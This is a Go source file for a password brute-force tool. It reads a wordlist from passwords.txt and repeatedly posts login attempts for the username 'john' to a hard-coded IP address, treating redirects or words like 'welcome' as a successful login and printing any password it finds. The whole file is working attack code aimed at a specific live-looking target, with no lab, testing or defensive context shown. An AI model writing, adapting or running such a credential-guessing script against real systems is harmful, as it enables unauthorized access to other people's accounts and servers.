package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func main() {
	target := "http://136.110.43.120"
	username := "john"
	passwordFile := "passwords.txt"

	file, err := os.Open(passwordFile)
	if err != nil {
		fmt.Printf("Error opening password file: %v\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	attemptCount := 0

	fmt.Printf("[*] Starting brute force attack against %s\n", target)
	fmt.Printf("[*] Target username: %s\n", username)
	fmt.Printf("[*] Password wordlist: %s\n\n", passwordFile)

	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password == "" {
			continue
		}

		attemptCount++
		fmt.Printf("[%d] Trying password: %s... ", attemptCount, password)

		if tryLogin(target, username, password) {
			fmt.Printf("\n\n[+] SUCCESS! Valid credentials found:\n")
			fmt.Printf("[+] Username: %s\n", username)
			fmt.Printf("[+] Password: %s\n", password)
			return
		} else {
			fmt.Printf("Failed\n")
		}

		time.Sleep(100 * time.Millisecond)
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading password file: %v\n", err)
	}

	fmt.Printf("\n[-] Brute force complete. No valid credentials found.\n")
}

func tryLogin(target, username, password string) bool {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)

	resp, err := client.PostForm(target, data)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	bodyStr := string(body)

	if resp.StatusCode == 302 || resp.StatusCode == 301 {
		return true
	}

	if strings.Contains(strings.ToLower(bodyStr), "success") ||
		strings.Contains(strings.ToLower(bodyStr), "welcome") ||
		strings.Contains(strings.ToLower(bodyStr), "dashboard") ||
		strings.Contains(strings.ToLower(bodyStr), "logged in") {
		return true
	}

	if !strings.Contains(strings.ToLower(bodyStr), "invalid") &&
		!strings.Contains(strings.ToLower(bodyStr), "incorrect") &&
		!strings.Contains(strings.ToLower(bodyStr), "failed") &&
		!strings.Contains(strings.ToLower(bodyStr), "wrong") {
		if len(bodyStr) < 500 || strings.Contains(bodyStr, "logout") {
			return true
		}
	}

	return false
}
